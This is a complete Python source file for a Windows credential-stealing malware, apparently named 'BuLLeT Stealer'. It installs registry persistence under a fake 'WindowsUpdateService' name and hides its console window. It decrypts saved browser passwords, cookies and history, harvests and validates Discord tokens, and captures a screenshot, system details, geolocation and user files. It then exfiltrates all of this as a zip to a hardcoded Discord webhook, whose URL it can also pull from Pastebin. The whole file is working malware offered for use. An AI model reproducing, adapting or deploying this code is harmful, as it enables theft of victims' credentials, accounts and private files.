import os
import sqlite3
import json
import requests
import platform
import socket
import psutil
import browser_cookie3
import win32crypt
import shutil
import tempfile
import zipfile
from PIL import ImageGrab
import subprocess
import re
from Crypto.Cipher import AES
import base64
import winreg
import geocoder
from datetime import datetime
import uuid

class SystemHarvester:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp()
        self.webhook_url = self.fetch_config()
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.roaming = os.getenv('APPDATA')
        self.local = os.getenv('LOCALAPPDATA')
        self.tokens = []
        self.ids = []
        self.discord_users = []
        self.system_uuid = self.get_system_uuid()
        self.log_messages = []

    def log(self, message):
        """بدل الطباعة في CMD، نخزن الرسائل للإرسال للويبهوك"""
        self.log_messages.append(message)

    def fetch_config(self):
        try:
            pastebin_url = "https://pastebin.com/raw/BuFX66Jp"
            response = requests.get(pastebin_url)
            return response.text.strip()
        except:
            return "https://discord.com/api/webhooks/1425830472176631911/JVaM7GFpG_XBNuslgUiCRZHL6nTXRP5ezUSHD-V9K_2bnN1VZYytJzrez6lWOGzh7kgk"

    def get_system_uuid(self):
        try:
            result = subprocess.check_output('wmic csproduct get uuid', shell=True).decode()
            uuid_line = result.split('\n')[1].strip()
            return uuid_line if uuid_line else "UNKNOWN-UUID"
        except:
            return "UNKNOWN-UUID"

    def install_persistence(self):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, os.path.abspath(__file__))
            self.log("✅ Persistence installed successfully")
        except Exception as e:
            self.log("❌ Failed to install persistence")

    def capture_screenshot(self):
        try:
            screenshot_path = os.path.join(self.temp_dir, "ScreenShot.png")
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path, "PNG")
            self.log("✅ Screenshot captured successfully")
            return screenshot_path
        except Exception as e:
            self.log("❌ Failed to capture screenshot")
            return None

    def get_encryption_key(self, browser_path):
        try:
            local_state_path = os.path.join(browser_path, "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except:
            return None

    def decrypt_password(self, password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    def extract_browser_data(self, browser_name, browser_path, profile_name="Default"):
        try:
            full_path = os.path.join(browser_path, profile_name)
            if not os.path.exists(full_path):
                return
            
            browser_dir = os.path.join(self.temp_dir, "browser", browser_name)
            if profile_name != "Default":
                browser_dir = os.path.join(browser_dir, profile_name)
            os.makedirs(browser_dir, exist_ok=True)

            # استخراج كلمات المرور
            key = self.get_encryption_key(browser_path)
            db_path = os.path.join(full_path, "Login Data")
            temp_db = os.path.join(self.temp_dir, f"temp_login_{browser_name}_{profile_name}.db")
            
            if os.path.exists(db_path):
                shutil.copyfile(db_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                passwords = []
                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    password = self.decrypt_password(row[2], key) if key else ""
                    
                    if origin_url and username and password:
                        passwords.append(f"URL: {origin_url}\nUsername: {username}\nPassword: {password}\n")
                
                conn.close()
                os.remove(temp_db)
                
                if passwords:
                    pass_file = os.path.join(browser_dir, "Passwords.txt")
                    with open(pass_file, "w", encoding="utf-8") as f:
                        f.write("\n".join(passwords))

            # استخراج الكوكيز
            try:
                cookies = []
                if "chrome" in browser_name.lower() or browser_name == "Chrome":
                    for cookie in browser_cookie3.chrome(domain_name='', browser_name=browser_name):
                        cookies.append(f"Domain: {cookie.domain} | Name: {cookie.name} | Value: {cookie.value}")
                elif "edge" in browser_name.lower():
                    for cookie in browser_cookie3.edge(domain_name=''):
                        cookies.append(f"Domain: {cookie.domain} | Name: {cookie.name} | Value: {cookie.value}")
                elif "brave" in browser_name.lower():
                    for cookie in browser_cookie3.brave(domain_name=''):
                        cookies.append(f"Domain: {cookie.domain} | Name: {cookie.name} | Value: {cookie.value}")
                
                if cookies:
                    cookies_file = os.path.join(browser_dir, "Cookies.txt")
                    with open(cookies_file, "w", encoding="utf-8") as f:
                        f.write("\n".join(cookies))
            except:
                pass

            # استخراج التاريخ
            history_path = os.path.join(full_path, "History")
            temp_history = os.path.join(self.temp_dir, f"temp_history_{browser_name}_{profile_name}.db")
            
            if os.path.exists(history_path):
                shutil.copyfile(history_path, temp_history)
                conn = sqlite3.connect(temp_history)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
                
                history = []
                for row in cursor.fetchall():
                    history.append(f"URL: {row[0]}\nTitle: {row[1]}\nVisits: {row[2]}\n")
                
                conn.close()
                os.remove(temp_history)
                
                if history:
                    history_file = os.path.join(browser_dir, "History.txt")
                    with open(history_file, "w", encoding="utf-8") as f:
                        f.write("\n".join(history))
                        
        except Exception as e:
            pass

    def harvest_browser_data(self):
        browsers = {
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
            "Opera": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera GX Stable"),
            "Vivaldi": os.path.join(os.environ['LOCALAPPDATA'], "Vivaldi", "User Data"),
            "Yandex": os.path.join(os.environ['LOCALAPPDATA'], "Yandex", "YandexBrowser", "User Data")
        }
        
        browser_count = 0
        for browser_name, browser_path in browsers.items():
            if os.path.exists(browser_path):
                self.extract_browser_data(browser_name, browser_path, "Default")
                browser_count += 1
                
                for item in os.listdir(browser_path):
                    if item.startswith("Profile") or item == "Default":
                        self.extract_browser_data(browser_name, browser_path, item)
        
        self.log(f"✅ Browser data harvested from {browser_count} browsers")

    def get_master_key(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        except:
            return None

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return ""

    def get_discord_user_info(self, token):
        try:
            headers = {'Authorization': token}
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if response.status_code == 200:
                user_data = response.json()
                user_info = {
                    'token': token,
                    'username': user_data.get('username', 'N/A'),
                    'discriminator': user_data.get('discriminator', 'N/A'),
                    'id': user_data.get('id', 'N/A'),
                    'email': user_data.get('email', 'N/A'),
                    'phone': user_data.get('phone', 'N/A'),
                    'mfa_enabled': user_data.get('mfa_enabled', False),
                    'premium_type': user_data.get('premium_type', 0),
                    'verified': user_data.get('verified', False),
                    'locale': user_data.get('locale', 'N/A')
                }
                return user_info
        except:
            pass
        return None

    def grab_tokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            
            if "cord" in name.lower():
                if os.path.exists(self.roaming + f'\\{name.replace(" ", "").lower()}\\Local State'):
                    master_key = self.get_master_key(self.roaming + f'\\{name.replace(" ", "").lower()}\\Local State')
                    if master_key:
                        for file_name in os.listdir(path):
                            if file_name[-3:] not in ["log", "ldb"]:
                                continue
                            try:
                                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                                    for y in re.findall(self.encrypted_regex, line):
                                        try:
                                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), master_key)
                                            if token and token not in self.tokens:
                                                user_info = self.get_discord_user_info(token)
                                                if user_info:
                                                    self.tokens.append(token)
                                                    self.discord_users.append(user_info)
                                                    self.ids.append(user_info['id'])
                                        except:
                                            pass
                            except:
                                pass
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    try:
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regex, line):
                                if token not in self.tokens:
                                    user_info = self.get_discord_user_info(token)
                                    if user_info:
                                        self.tokens.append(token)
                                        self.discord_users.append(user_info)
                                        self.ids.append(user_info['id'])
                    except:
                        pass

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    try:
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regex, line):
                                if token not in self.tokens:
                                    user_info = self.get_discord_user_info(token)
                                    if user_info:
                                        self.tokens.append(token)
                                        self.discord_users.append(user_info)
                                        self.ids.append(user_info['id'])
                    except:
                        pass

    def harvest_discord_tokens(self):
        tokens_dir = os.path.join(self.temp_dir, "Discord")
        os.makedirs(tokens_dir, exist_ok=True)
        
        self.grab_tokens()
        
        tokens_file = os.path.join(tokens_dir, "Tokens.txt")
        
        with open(tokens_file, "w", encoding="utf-8") as f:
            f.write("=== DISCORD TOKENS FOUND ===\n\n")
            
            if not self.discord_users:
                f.write("No tokens found!\n")
                self.log("❌ No Discord tokens found")
            else:
                for i, user in enumerate(self.discord_users, 1):
                    f.write(f"Token #{i}:\n")
                    f.write(f"Token: {user['token']}\n")
                    f.write(f"Username: {user['username']}#{user['discriminator']}\n")
                    f.write(f"ID: {user['id']}\n")
                    f.write(f"Email: {user['email']}\n")
                    f.write(f"Phone: {user['phone']}\n")
                    f.write(f"2FA: {'Enabled' if user['mfa_enabled'] else 'Disabled'}\n")
                    f.write(f"Nitro: {'Yes' if user['premium_type'] > 0 else 'No'}\n")
                    f.write(f"Verified: {user['verified']}\n")
                    f.write(f"Locale: {user['locale']}\n")
                    f.write("="*50 + "\n\n")
                
                self.log(f"✅ Found {len(self.discord_users)} Discord tokens")

    def collect_system_info(self):
        system_info = []
        
        system_info.append("=== SYSTEM INFORMATION ===")
        system_info.append(f"Computer Name: {socket.gethostname()}")
        system_info.append(f"Username: {os.getlogin()}")
        system_info.append(f"OS: {platform.system()} {platform.release()}")
        system_info.append(f"Version: {platform.version()}")
        system_info.append(f"Architecture: {platform.architecture()[0]}")
        system_info.append(f"Processor: {platform.processor()}")
        system_info.append(f"UUID: {self.system_uuid}")
        
        memory = psutil.virtual_memory()
        system_info.append(f"Total Memory: {memory.total // (1024**3)} GB")
        
        system_info.append("\n=== NETWORK INFORMATION ===")
        for interface, addrs in psutil.net_if_addrs().items():
            system_info.append(f"Interface: {interface}")
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    system_info.append(f"  IP Address: {addr.address}")
        
        system_file = os.path.join(self.temp_dir, "System_Info.txt")
        with open(system_file, "w", encoding="utf-8") as f:
            f.write("\n".join(system_info))
        
        self.log("✅ System information collected")

    def get_geolocation(self):
        try:
            g = geocoder.ip('me')
            location_info = [
                "=== LOCATION INFORMATION ===",
                f"IP: {g.ip}",
                f"Region: {g.state}",
                f"Country: {g.country}",
                f"City: {g.city}",
                f"Timezone: {g.timezone}",
                f"ISP: {g.org}"
            ]
            
            location_file = os.path.join(self.temp_dir, "Location_Info.txt")
            with open(location_file, "w", encoding="utf-8") as f:
                f.write("\n".join(location_info))
            
            self.log("✅ Geolocation data collected")
            return g
        except Exception as e:
            self.log("❌ Failed to get geolocation")
            return None

    def is_safe_file_type(self, file_path):
        """يتحقق من أن الملف آمن للنقل (ليس فيديو كبير أو ملف نظام)"""
        safe_extensions = {
            '.txt', '.log', '.ini', '.cfg', '.conf', '.xml', '.json',
            '.doc', '.docx', '.pdf', '.rtf',
            '.xls', '.xlsx', '.csv',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.ico',
            '.zip', '.rar', '.7z',
            '.py', '.js', '.html', '.css', '.php', '.java', '.cpp', '.c', '.h'
        }
        
        dangerous_extensions = {
            '.exe', '.dll', '.sys', '.msi', '.bat', '.cmd', '.ps1', '.vbs',
            '.iso', '.img', '.dmg',
            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm',
            '.mp3', '.wav', '.flac', '.aac',
            '.psd', '.ai', '.eps'
        }
        
        file_ext = os.path.splitext(file_path)[1].lower()
        
        if file_ext in dangerous_extensions:
            return False
        elif file_ext in safe_extensions:
            return True
        else:
            # للملفات ذات الامتدادات غير المعروفة، تحقق من حجمها
            try:
                file_size = os.path.getsize(file_path)
                return file_size <= 2 * 1024 * 1024  # 2MB حد للملفات غير المعروفة
            except:
                return False

    def dump_random_files(self):
        user_profile = os.environ['USERPROFILE']
        target_dirs = {
            "Desktop": os.path.join(user_profile, "Desktop"),
            "Downloads": os.path.join(user_profile, "Downloads"),
            "Pictures": os.path.join(user_profile, "Pictures"),
            "Videos": os.path.join(user_profile, "Videos"),
            "Documents": os.path.join(user_profile, "Documents")
        }
        
        total_files = 0
        total_size = 0
        max_total_size = 20 * 1024 * 1024
        
        for dir_name, dir_path in target_dirs.items():
            if os.path.exists(dir_path):
                files = []
                for item in os.listdir(dir_path):
                    item_path = os.path.join(dir_path, item)
                    if os.path.isfile(item_path):
                        try:
                            file_size = os.path.getsize(item_path)
                            if (file_size <= 5 * 1024 * 1024 and 
                                file_size + total_size <= max_total_size and
                                self.is_safe_file_type(item_path)):
                                files.append((item_path, file_size))
                        except:
                            pass
                
                files.sort(key=lambda x: x[1])
                
                selected_files = files[:3]
                if selected_files:
                    target_dir = os.path.join(self.temp_dir, "Dumped_Files", dir_name)
                    os.makedirs(target_dir, exist_ok=True)
                    
                    for file_path, file_size in selected_files:
                        try:
                            if total_size + file_size <= max_total_size:
                                file_name = os.path.basename(file_path)
                                dest_path = os.path.join(target_dir, file_name)
                                shutil.copy2(file_path, dest_path)
                                total_files += 1
                                total_size += file_size
                        except:
                            pass
        
        self.log(f"✅ Dumped {total_files} files ({total_size//1024} KB total)")
        return total_files

    def count_grabbed_data(self):
        cookies_count = 0
        passwords_count = 0
        discord_tokens = len(self.tokens)
        screenshots = 1 if os.path.exists(os.path.join(self.temp_dir, "ScreenShot.png")) else 0
        
        for root, dirs, files in os.walk(os.path.join(self.temp_dir, "browser")):
            for file in files:
                if file == "Cookies.txt":
                    try:
                        with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                            cookies_count += len(f.readlines())
                    except:
                        pass
        
        for root, dirs, files in os.walk(os.path.join(self.temp_dir, "browser")):
            for file in files:
                if file == "Passwords.txt":
                    try:
                        with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                            passwords_count += len([line for line in f.readlines() if line.startswith('URL:')])
                    except:
                        pass
        
        return {
            "cookies": cookies_count,
            "passwords": passwords_count,
            "discord_tokens": discord_tokens,
            "screenshots": screenshots
        }

    def create_zip_archive(self):
        zip_path = os.path.join(self.temp_dir, "SystemData.zip")
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(self.temp_dir):
                for file in files:
                    if file != "SystemData.zip":
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, self.temp_dir)
                        zipf.write(file_path, arcname)
        
        self.log("✅ ZIP archive created successfully")
        return zip_path

    def send_logs_to_webhook(self):
        """إرسال اللوجات للويبهوك"""
        try:
            if not self.log_messages:
                return
            
            log_text = "\n".join(self.log_messages)
            
            payload = {
                "username": "System Harvester Logs",
                "embeds": [
                    {
                        "title": "📊 Execution Logs",
                        "color": 3447003,
                        "description": f"```\n{log_text}\n```",
                        "timestamp": datetime.now().isoformat()
                    }
                ]
            }
            
            requests.post(self.webhook_url, json=payload, timeout=10)
            
        except:
            pass

    def send_complete_to_discord(self, total_files, geo_data):
        try:
            grabbed_data = self.count_grabbed_data()
            
            # الحصول على معلومات أول يوزر ديسكورد
            discord_info = "```ini\nUser : N/A\nID : N/A\nToken : N/A\nEmail : N/A\nPhone : N/A\n2FA : Disabled\nNitro : No\nVerified : False\nLocale : N/A\n```"
            
            if self.discord_users:
                user = self.discord_users[0]
                discord_info = f"```ini\nUser : @{user['username']}\nID : {user['id']}\nToken : {user['token']}\nEmail : {user['email']}\nPhone : {user['phone'] if user['phone'] else 'N/A'}\n2FA : {'Enabled' if user['mfa_enabled'] else 'Disabled'}\nNitro : {'Yes' if user['premium_type'] > 0 else 'No'}\nVerified : {user['verified']}\nLocale : {user['locale']}\n```"
            
            payload = {
                "username": "!  BuLLeT Stealer",
                "avatar_url": "https://i.ibb.co/WWTBJd7q/3fb513e78a4e5d5d8f674bf123758981-removebg-preview.png",  
                "embeds": [
                    {
                        "title": "!  BuLLeT Stealer",
                        "url": "https://bullet-about.netlify.app",
                        "color": 255,
                        "fields": [
                            {
                                "name": "System Info",
                                "value": f"```ini\nComputer Name: {socket.gethostname()}\nComputer OS: {platform.system()} {platform.release()}\nTotal Memory: {psutil.virtual_memory().total // (1024**3)} GB\nUUID: {self.system_uuid}\nCPU: {platform.processor().split(',')[0] if platform.processor() else 'Unknown'}\nGPU: N/A\n```",
                                "inline": False
                            },
                            {
                                "name": "IP Info",
                                "value": f"```ini\nIP: {geo_data.ip if geo_data else 'N/A'}\nRegion: {geo_data.state if geo_data else 'N/A'}\nCountry: {geo_data.country if geo_data else 'N/A'}\nTimezone: {geo_data.timezone if geo_data else 'N/A'}\nCellular Data: N/A\nProxy/VPN: None\n```",
                                "inline": False
                            },
                            {
                                "name": "Grabbed Data",
                                "value": f"```ini\nCookies : {grabbed_data['cookies']}\nPasswords : {grabbed_data['passwords']}\nDiscord Sessions : {grabbed_data['discord_tokens']}\nMinecraft Session Files : 0\nRoblox Cookies : 0\nScreenshots : {grabbed_data['screenshots']}\nWebcam : 0\nWallets : 0\nTelegram Sessions : 0\n```",
                                "inline": False
                            },
                            {
                                "name": "Discord",
                                "value": discord_info,
                                "inline": False
                            }
                        ],
                        "image": {
                            "url": "attachment://screenshot.png"
                        },
                        "footer": {
                            "text": "© BuLLeT Stealer • 2025",
                            "icon_url": "https://i.ibb.co/WWTBJd7q/3fb513e78a4e5d5d8f674bf123758981-removebg-preview.png"
                        },
                        "timestamp": datetime.now().isoformat()
                    }
                ]
            }

            screenshot_path = os.path.join(self.temp_dir, "ScreenShot.png")
            zip_path = os.path.join(self.temp_dir, "SystemData.zip")
            
            if not os.path.exists(screenshot_path):
                raise Exception(f"Screenshot file not found: {screenshot_path}")
            
            if not os.path.exists(zip_path):
                raise Exception(f"ZIP file not found: {zip_path}")
            
            if not self.webhook_url or not self.webhook_url.startswith("https://discord.com/api/webhooks/"):
                raise Exception("Invalid Discord webhook URL")

            with open(screenshot_path, "rb") as f1, open(zip_path, "rb") as f2:
                files = {
                    'payload_json': (None, json.dumps(payload), 'application/json'),
                    'files[0]': ('screenshot.png', f1, 'image/png'),
                    'files[1]': ('SystemData.zip', f2, 'application/zip')
                }
                
                response = requests.post(self.webhook_url, files=files, timeout=30)
                
                if response.status_code not in (200, 204):
                    raise Exception(f"Discord API returned status {response.status_code}: {response.text}")
                
            return True
            
        except Exception as e:
            raise Exception(f"Send error: {str(e)}")

    def cleanup(self):
        try:
            shutil.rmtree(self.temp_dir)
            self.log("✅ Cleanup completed")
        except:
            self.log("❌ Cleanup failed")

    def execute(self):
        try:
            
            self.hide_cmd_window()
            
            self.log("🚀 Starting System Harvester...")
            
            self.install_persistence()
            self.capture_screenshot()
            self.harvest_browser_data()
            self.harvest_discord_tokens()
            self.collect_system_info()
            geo_data = self.get_geolocation()
            total_files = self.dump_random_files()
            zip_path = self.create_zip_archive()
            
            self.log("📤 Sending data to Discord...")
            try:
                if self.send_complete_to_discord(total_files, geo_data):
                    self.log("✅ All data sent successfully!")
                else:
                    self.log("❌ Failed to send main data")
            except Exception as e:
                self.log(f"❌ Failed to send main data: {str(e)}")
            
            
            self.send_logs_to_webhook()
            
            self.cleanup()
            
        except Exception as e:
            self.log(f"💥 Critical error: {str(e)}")
            self.send_logs_to_webhook()

    def hide_cmd_window(self):
        """إخفاء نافذة الـ CMD"""
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

if __name__ == "__main__":
    import time
    time.sleep(10)
    
    harvester = SystemHarvester()
    harvester.execute()